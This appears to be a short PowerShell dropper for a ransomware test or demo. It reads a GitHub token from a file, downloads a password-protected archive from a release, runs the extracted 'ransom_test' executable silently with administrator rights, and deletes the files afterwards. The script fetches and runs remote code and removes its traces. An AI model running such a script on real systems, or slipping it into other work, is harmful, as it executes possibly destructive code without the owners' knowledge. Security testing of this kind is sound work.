$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\ransom_test.zip'
Remove-Item $env:TEMP\ransom_test.zip
Start-Process -FilePath $env:TEMP\ransom_test_v???.exe -Args "/S" -Verb RunAs -Wait
Remove-Item $env:TEMP\ransom_test_v???.exe
